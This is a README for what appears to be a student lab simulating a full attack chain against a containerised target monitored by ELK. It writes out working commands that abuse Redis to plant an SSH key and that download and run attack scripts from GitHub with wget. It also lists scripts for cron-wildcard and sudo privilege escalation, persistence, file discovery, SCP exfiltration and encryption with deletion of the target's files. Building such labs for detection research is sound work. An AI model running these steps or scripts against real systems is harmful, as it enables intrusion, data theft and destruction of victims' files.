# Preparing the Setup (Pre-requisites)

## Change docker-desktop settings (increase RAM and max virtual memory required by ELK)
- Go to %UserProfile%
- Create a file .wslconfig
- Edit to include the following below:

```
# Settings apply across all Linux distros running on WSL 2
[wsl2]
kernelCommandLine = "sysctl.vm.max_map_count=262144"
# Limits VM memory to use no more than 5 GB, this can be set as whole numbers using GB or MB
memory=5GB
```
References:
- https://mrakelinggar.medium.com/set-up-configs-like-memory-limits-in-docker-for-windows-and-wsl2-80689997309c
- https://stackoverflow.com/questions/69214301/using-docker-desktop-for-windows-how-can-sysctl-parameters-be-configured-to-per
- https://gist.github.com/audionerd/d7d77d9af080a7a87d9b

# Setting up the Attack Environment

1. Bring up all the containers:
```
vagrant up --no-parallel
```
2. Start metricbeat in the ELK container. Open the terminal (docker terminal or external) and enter:
```
service metricbeat start && metricbeat setup -e
```

# Exploit Manual/Steps
1. Reverse shell into the target
```
sudo ssh -i ~/.ssh/id_rsa resch@172.18.0.2

# Accepts the prompt to trust connection
yes
```
Should the connection not work (still asked for password), run the following commands again:
```
printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authorized_keys'\nsave\nexit" | redis-cli -h 172.18.0.2

sudo ssh -i ~/.ssh/id_rsa resch@172.18.0.2

yes
```

2. Download all attack scripts which also executes privilege escalation exploiting Crobjob
```
wget https://raw.githubusercontent.com/S692/ossas/main/Gp5_import_scripts_and_PE.sh && chmod +x Gp5_import_scripts_and_PE.sh

# Downloads scripts and run PE exploit
./Gp5_import_scripts_and_PE.sh

# ONLY IF YOU did not successfully become root, execute the following command:
cd /home/resch/.scripts
./Gp5_PEexploitSudo.sh
```
3. Run the attack chain scripts chaining persistence to encryption
```
cd /home/resch/.scripts
./Gp5_attack_chain.sh
```
Alternatively, it can be executed one by one:
```
cd /home/resch/.scripts
./check.sh
pip3 install -r ./requirements.txt
./Gp5_persistence1.sh
./Gp5_file_and_dir_discovery.sh
./Gp5_collectiontarget.sh
./Gp5_exfiltration_target.sh
python3 Gp5_encrypt.py fndd-stripped.txt
```
4. After exfiltration, the encrypted exfiltrated files can be decrypted on the attacker's machine
```
cd ~

./Gp5_after_exfiltration_attk.sh

cd /home/vagrant/exfiltrated/exfiltrate_backups_decrypted

ls -la
```
# Information on the project files
### Attack Scripts/Files
- Gp5_PEexploitCron.sh
  - Privilege excalation via cronjob wildcard injection
- Gp5_PEexploitSudo.sh
  - Privilege escalaion via Sudo heap overflow vulnerability
- Gp5_persistence1.sh && Gp5_persistence2.sh
  - Persistence to enable other scripts to run on startup
- Gp5_file_and_dir_discovery.sh && Gp5_file_and_dir_discovery-stripped.sh
  - List directories and files of potential interest
- Gp5_collectiontarget.sh
  - Crontab with RSYNC to automatically add files into exfiltration destination folder
- Gp5_exfiltration_attk.sh
  - Setup collection point for the files that will be exfiltrated later on
- Gp5_exfiltration_target.sh
  - Encrypt and exfiltrate files out using SCP via SSH to the target machine
- Gp5_after_exfiltration_attk.sh
  - Used to decrypt exfiltrated files
- Gp5_encrypt.py
  - Used to encrypt and delete files listed from file and directories discovery
- check.sh
  - Check for dependencies for Gp5_encrpy.py to execute successfully
- requirements.txt
  - List of dependencies needed for encryption and deletion (impact)
- Gp5_import_scripts_and_PE.sh
  - Script to import the scripts above into the target machine for execution
  - Runs Gp5_PEexploitCron.sh once all files have been downloaded
---
### Container Setup Files
- Gp5_setup.sh
  - Used to setup and download all the dependencies and files needed for the simulation attack to work on the target machine.
- Gp5_attk_setup.sh
  - Used to setup and download all the dependencies/files needed on the attacker's machine, to successfully exploit the target.
---
### Logs and Monitoring Tools (Beats) Setup files
- auditbeat.yml
  - Preconfigured auditbeat configuration file that will be replaced with the one in the target system.
- filebeatConf.py
  - Replaces keywords in the filebeats configuration file
- redis.yml
  - Redis module configuration file that exists in filebeats
- system.yml
  - System module configuration file that exisits in filebeats
- metricbeat.yml
  - Main configuration file of metricbeat taht will be replaced with the one in the installed system.
- kibana.yml
